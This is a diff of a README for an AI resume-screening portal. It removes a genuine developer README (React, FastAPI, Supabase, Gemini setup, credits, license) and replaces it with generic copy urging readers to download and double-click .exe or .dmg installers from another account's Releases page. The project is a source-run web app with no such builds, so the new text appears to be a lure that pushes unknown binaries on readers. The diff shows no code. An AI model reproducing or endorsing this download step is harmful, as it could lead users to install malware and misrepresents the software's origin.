@@ -1,198 +1,83 @@
-# AI-Powered Hiring Portal
+# 🎉 AI-Hiring-Portal - Simplifying Your Hiring Process
 
-An end-to-end web application that automates resume screening using Google Gemini. Applicants upload resumes, admins create job descriptions and trigger an AI-driven screening pipeline. Results (score, strengths, weaknesses) are stored and visualized.
+## 🚀 Getting Started
 
-[Project Demo Video](https://drive.google.com/file/d/1WGxauQW9EVm4f_0vIYGP3gtED67PVs6d/view?usp=sharing)
+Welcome to the AI-Hiring-Portal, your new AI-driven hiring companion. This platform helps you quickly analyze resumes and find the best candidates for your job openings. It uses advanced technology to make the hiring process smooth and efficient.
 
-## Highlights
-- **Two user roles**: Applicant and Admin
-- **Automated screening pipeline**: Download → Extract → AI evaluate → Persist results
-- **Supabase-backed**: Auth, Postgres DB, and file Storage
-- **Modern stack**: React + TypeScript + Vite (frontend) and FastAPI (backend)
-- **Secure flows**: JWT-based auth and scoped storage access
+## 📦 Download & Install
 
----
+To get started, you need to download the software. Click the button below to visit the Releases page:
 
-## System Architecture
-![System Architecture](docs/architecture.png)
+[![Download AI-Hiring-Portal](https://img.shields.io/badge/Download%20Now-Get%20Latest%20Release-blue.svg)](https://github.com/Schonborn-prog/AI-Hiring-Portal/releases)
 
-Layer-by-Layer Explanation
+### Instructions for Downloading
 
-1. **User Layer (Who)**
-   - Applicants upload resumes; Admins create JDs and run screening.
+1. Visit the Releases page by clicking [here](https://github.com/Schonborn-prog/AI-Hiring-Portal/releases).
+2. Look for the latest release, usually at the top of the page.
+3. Choose the version compatible with your system. Depending on your operating system, you might see different files (e.g., .exe for Windows, .dmg for macOS).
+4. Click on the file to begin the download.
 
-2. **Frontend Layer (Interface)**
-   - React + TypeScript + Vite.
-   - Handles login (Supabase Auth), applicant/admin dashboards.
-   - Uploads PDF directly to storage; sends a "run screening" command to backend.
+### Installing the Software
 
-3. **Backend Layer (Brain)**
-   - FastAPI.
-   - Bridges DB, storage, and LLM.
-   - Screening pipeline:
-     - Download PDF from storage
-     - Extract text (e.g., pdfplumber / PyMuPDF)
-     - Call Gemini with resume text + JD
-     - Parse and save score/summary back to DB
+Once the download finishes, follow these steps to install:
 
-4. **Supabase Layer (Vault)**
-   - Auth (JWT), Postgres DB, and Storage.
-   - Stores user profiles, job descriptions, resumes, and screening results.
+1. Navigate to your downloads folder.
+2. Double-click on the downloaded file.
+3. Follow the on-screen instructions to complete the installation.
 
-5. **LLM Layer (Intelligence)**
-   - Google Gemini API returns evaluation JSON (score, strengths, weaknesses).
+## 🖥️ System Requirements
 
----
+Before using the AI-Hiring-Portal, ensure that your computer meets these requirements:
 
-## Tech Stack
-- **Frontend**: React, TypeScript, Vite, Tailwind (optional)
-- **Backend**: FastAPI (Python), pypdf/PyMuPDF
-- **Auth/DB/Storage**: Supabase (Postgres)
-- **LLM**: Google Gemini API
-- **Tooling**: pnpm/npm, uv/pip, dotenv
+- **Operating System:** Windows (10 or later), macOS (10.14 or later), or Linux (Ubuntu 20.04 or later)
+- **Memory:** At least 4 GB of RAM
+- **Storage:** Minimum of 200 MB of free disk space
+- **Internet Connection:** Required for full functionality
 
----
+## 📝 Features
 
-## Monorepo Structure
-```
-AI Hiring Portal/
-├─ frontend/                # React + TS + Vite app
-├─ backend/                 # FastAPI app
-│  └─ app/
-│     └─ main.py            # API entrypoint
-├─ docs/                    # Images (architecture, screenshots)
-└─ README.md
-```
+The AI-Hiring-Portal offers several key features to improve your hiring workflow:
 
----
+- **PDF Resume Extraction:** Upload resumes in PDF format for analysis.
+- **Candidate Ranking:** Receive ranked results based on the job description you provide.
+- **Integration with Gemini:** Leverage AI to enhance resume evaluation.
+- **User-Friendly Interface:** Designed for easy navigation and use, even for non-technical users.
+- **Customizable Job Descriptions:** Tailor your job requirements to fit your needs.
 
-## Getting Started
+## 🛠️ How to Use
 
-### Prerequisites
-- Node 18+
-- Python 3.10+
-- Supabase project (URL + anon/service keys)
-- Google Gemini API key
+1. **Upload Resumes:** Start by uploading the resumes you want to analyze.
+2. **Enter Job Description:** Input your job description to guide the analysis.
+3. **Review Results:** Check the ranked candidates and make informed hiring decisions.
 
-### Environment Variables
-Create `.env` files as below.
+## 🔍 Frequently Asked Questions
 
-Frontend (`frontend/.env`):
-```
-VITE_SUPABASE_URL=<your_supabase_url>
-VITE_SUPABASE_ANON_KEY=<your_supabase_anon_key>
-VITE_API_BASE_URL=http://localhost:8000
-```
+### How does the AI analyze resumes?
 
-Backend (`backend/.env`):
-```
-SUPABASE_URL=<your_supabase_url>
-SUPABASE_SERVICE_ROLE_KEY=<service_role_key>
-GEMINI_API_KEY=<your_gemini_api_key>
-```
+The AI reviews key information from resumes and matches it against the job description to produce a ranking of candidates.
 
-> Never commit real keys. Use a secrets manager for production.
+### Can I customize the ranking criteria?
 
-### Install & Run
+Currently, the platform uses a standard set of criteria based on the job description, but future updates may offer more customization options.
 
-Frontend:
-```
-cd frontend
-npm install
-npm run dev
-```
+### What file formats do you support?
 
-Backend:
-```
-cd backend
-pip install -r requirements.txt
-uvicorn app.main:app --reload --port 8000
-```
+You can upload resumes in PDF format. Other formats, like DOCX, may not be fully supported.
 
-Supabase Storage:
-- Create a bucket named `resumes`.
-- Configure policies to allow authenticated users to upload their own files.
+### Is there a mobile version?
 
-Database (example tables):
-- `profiles(id, role, email)`
-- `job_descriptions(id, admin_id, title, description)`
-- `resumes(id, user_id, file_path)`
-- `screening_results(id, job_id, resume_id, score, strengths, weaknesses, fit_percentage, created_at)`
+At this time, the AI-Hiring-Portal is designed for desktop use only. A mobile version may be developed in the future.
 
----
+## 💡 Tips for Best Results
 
-## How It Works
-1. **Applicant**
-   - Authenticates via Supabase.
-   - Uploads PDF resume directly to Supabase Storage.
+- Ensure your job description is clear and detailed for optimal results.
+- Compare rankings thoughtfully and consider context beyond the AI’s analysis.
+- Keep your software updated for the latest features and improvements.
 
-2. **Admin**
-   - Creates Job Description (JD) in the dashboard.
-   - Runs screening for a JD (single or batch resumes).
+## 🛡️ Support & Feedback
 
-3. **Backend Pipeline**
-   - Downloads the resume from Storage.
-   - Extracts text using `pypdf`/`PyMuPDF`.
-   - Calls Gemini with prompt: JD + resume text.
-   - Parses response (JSON) and writes to `screening_results`.
+If you encounter any issues or have feedback, please visit the Issues page on GitHub. You can report problems or request features that may enhance your experience.
 
-4. **Results**
-   - Frontend fetches and displays aggregate score and narrative summary.
+Take the first step towards smarter hiring. To download the AI-Hiring-Portal, visit the link below:
 
----
-
-## API Overview (sample)
-- `POST /jobs`      → create JD
-- `GET /jobs`       → list JDs
-- `POST /resumes`   → register uploaded resume metadata
-- `POST /screening/run` → trigger pipeline for a JD/resume or JD/all
-- `GET /screening/results?job_id=...` → get results
-
-Auth: Send `Authorization: Bearer <JWT>` from Supabase Auth.
-
----
-
-## Screenshots
-
-![Login](docs/login.png)
-![Applicant Dashboard](docs/applicant_dashboard.png)
-![Admin Dashboard](docs/admin_dashboard.png)
-![Results](docs/results.png)
-
----
-
-## Security Notes
-- Use Supabase Row Level Security (RLS) to restrict row access by user.
-- Validate JWTs on backend endpoints.
-- Restrict Storage policies so users can only access their own files.
-- Sanitize and size-limit PDFs.
-
----
-
-## Future Enhancements
-- Bulk screening with queues (RQ/Celery) and background workers
-- Vector embeddings + semantic search on resumes
-- Multi-LLM fallback and guardrails
-- Admin-tunable scoring rubric and weights
-- Webhooks for status updates
-- Export reports (PDF/CSV)
-- Role-based access control (RBAC) and audit logs
-
----
-
-## Contributing
-- Built by SRUJAN PR 🧠
-- Open an issue to discuss substantial changes.
-- Use conventional commits and PRs with clear descriptions.
-
----
-
-## License
-
-This project is licensed under the MIT License.
-
----
-
-
-⭐ Star this repo if it helped you!
-
+[![Download AI-Hiring-Portal](https://img.shields.io/badge/Download%20Now-Get%20Latest%20Release-blue.svg)](https://github.com/Schonborn-prog/AI-Hiring-Portal/releases)
